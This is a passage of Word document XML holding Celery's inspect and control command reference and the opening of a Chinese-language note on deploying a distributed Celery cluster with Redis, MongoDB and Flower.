    <w:p w14:paraId="5C7280F2"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2FC9B296"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7D4E2D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D0EE40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[Commands]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F4E30B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active </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B0A0F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List of tasks currently being executed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041D247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active_queues </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0D9EA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List the task queues a worker is currently consuming from.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8D8028"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clock </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557A5D9D"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Get current logical clock value.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52663D21"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conf [include_defaults=False]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374406D0"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List configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C61BA6"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memdump [n_samples=10]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="161F9117"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Dump statistics of previous memsample requests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540DD467"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memsample </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319A6456"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Sample current RSS memory usage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0806D2"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objgraph [object_type=Request] [num=200 [max_depth=10]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFA560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Create graph of uncollected objects (memory-leak debugging).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C2CC58"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ping </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27260D3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Ping worker(s).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D67249"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query_task [id1 [id2 [... [idN]]]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32EB6344"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Query for task information by id.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4BEE37"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lastRenderedPageBreak/>
        <w:t>|    registered [attr1 [attr2 [... [attrN]]]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFE6488"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List of registered tasks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C63AA39"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report </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6686071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Information about Celery installation for bug reports.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECA50D9"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reserved </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728C72B7"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List of currently reserved tasks, not including scheduled/active.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1119C72D"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revoked </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FAC40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List of revoked task-ids.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433EAFE9"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scheduled </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56EF4B0B"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List of currently scheduled ETA/countdown tasks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351ED730"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stats </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B321F61"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Request worker statistics/information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CEACF5D"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721F7D4"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D2D601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Remote Control Options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70CB8D7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--timeout TIMEOUT, -t TIMEOUT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C001DB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Timeout in seconds (float) waiting for reply</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8215B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--destination DESTINATION, -d DESTINATION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08879B1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Comma separated list of destination node names.     </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>指定</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>worker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5556A9F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--json, -j            Use json as output format.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C40B7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3F831F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33A2907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w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>控制命令</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E8C67F0"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B7C4C0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Global Options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7ECE9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-A APP, --app APP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC93DE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-b BROKER, --broker BROKER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5934E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--result-backend RESULT_BACKEND</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054EE47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--loader LOADER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9FC11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--config CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C03022"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--workdir WORKDIR</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15033D7B"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--no-color, -C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385A42D8"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--quiet, -q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C323EB"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4E45EB3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B5CF50B"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">  [Commands]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683187F4"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add_consumer &lt;queue&gt; [exchange [type [routing_key]]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F397747"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Tell worker(s) to consume from task queue by name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA1BE40"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autoscale [max [min]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0C86D3"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Modify autoscale settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9D23D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cancel_consumer &lt;queue&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0075E5F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Tell worker(s) to stop consuming from task queue by name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460451A1"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disable_events </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBC74F8"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Tell worker(s) to stop sending task-related events.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE0071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election </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437DC624"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Hold election.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B272E6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enable_events </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392C8275"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Tell worker(s) to send task-related events.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B959632"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heartbeat </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34AFF83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Tell worker(s) to send event heartbeat immediately.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD35AE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pool_grow [N=1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105458B2"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Grow pool by n processes/threads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDB5E4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pool_restart </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BCE426"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Restart execution pool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3989402D"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pool_shrink [N=1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616FC4EE"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Shrink pool by n processes/threads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E2BC59"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rate_limit &lt;task_name&gt; &lt;rate_limit (e.g., 5/s | 5/m | 5/h)&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70606CA9"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Tell worker(s) to modify the rate limit for a task by type.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E35706D"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revoke [id1 [id2 [... [idN]]]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2326E821"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Revoke task by task id (or list of ids).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A40E5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shutdown </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC7A720"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Shutdown worker(s).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C63704F"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terminate &lt;signal&gt; [id1 [id2 [... [idN]]]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD85FF1"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Terminate task by task id (or list of ids).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E560D8"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time_limit &lt;task_name&gt; &lt;soft_secs&gt; [hard_secs]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC0EC1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Tell worker(s) to modify the time limit for task by type.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662E6CAC"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>例如</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>先停止一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>worker</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>消费任务便于手动重启升级</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0BEA6A" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="00DA0E72" w:rsidRDefault="00E00B9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celery control -b redis://:yourpassword@redis-host:6379/1 cancel_consumer default -d celery@airflow-worker-1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2C9583" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="36"/>
          <w:sz w:val="41"/>
          <w:szCs w:val="41"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="36"/>
          <w:sz w:val="41"/>
          <w:szCs w:val="41"/>
        </w:rPr>
        <w:t>笔记：集群部署celery分布式任务队列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B70947D"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lastRenderedPageBreak/>
        <w:t>估计来看此文的已经对</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有一些了解了，基本概念不再赘述。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FD4758"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网上找来找去全都是单机版的基础部署教程，也没有深入讲解分布式的部署过程。没办法只好靠着我渣渣英语强行研究了一波官方文档。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A6BCD5"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只有三台阿里云的服务器，不过做集群演示是够了。服务器配置比较低，所以选用</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>作为消息中间件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A70441" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="96" w:line="26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准备工作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5B1964"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实验环境：</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>centos 6.5</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python 3.4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE9DAC3"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三台服务器都装上</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python 3.4</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>celery 4.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7A1E9D"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我</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pip</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>使用的阿里云的源，默认</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版本是</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>4.1.0</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，直接使用</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>sudo pip install celery</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>即可安装</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF55A94"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其中一台做主服务器装上</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>mongodb</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，和</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的</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>flower</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>插件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A0CF08"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redis</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>做</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>broker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71335C11"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mongodb</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用来做</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>backend</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，存储任务执行结果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5FE32C"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flower</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用来监测</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集群的状态</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9AF783"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安装教程请自行搜索</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73161EF9" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00652128">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="240"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="3498DB"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3970D75F" wp14:editId="390322E4">
            <wp:extent cx="9730740" cy="4038600"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="55" name="图片 1">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730740" cy="4038600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AF341D" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="96" w:line="320" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="25"/>
          <w:szCs w:val="25"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="25"/>
          <w:szCs w:val="25"/>
        </w:rPr>
        <w:t>注：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066F078B"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i/>
          <w:iCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>celery</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>命令的详细参数请看官方文档：</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>http://docs.celeryproject.org/en/master/reference/celery.bin.worker.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C810C27"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i/>
          <w:iCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>从</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>celery 4.0</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>开始配置文件有所变化，具体请看官方文档：</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>http://docs.celeryproject.org/en/master/userguide/configuration.html#example-configuration-file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBC17E6"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queue</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>配置：</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>http://blog.csdn.net/tmpbook/article/details/52245716</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EDA368" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="96" w:line="32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编写代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA27FE1"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项目结构：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B10D64B" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00652128">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="240"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="3498DB"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="485E5454" wp14:editId="65D5E9A3">
            <wp:extent cx="1996440" cy="1074420"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="56" name="图片 56">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96440" cy="1074420"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
